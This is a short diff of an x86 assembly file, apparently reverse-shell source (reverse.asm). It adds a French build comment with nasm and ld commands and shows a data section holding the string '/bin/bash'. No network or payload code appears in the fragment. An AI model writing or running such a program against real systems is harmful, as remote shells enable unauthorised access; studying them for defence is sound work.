@@ -1,4 +1,4 @@
- 
+;Pour comiler : nasm -f elf32 -g reverse.asm && ld -m elf_i386 reverse.o
 global _start
 section .data
     SHELL       dw      "/bin/bash", 0
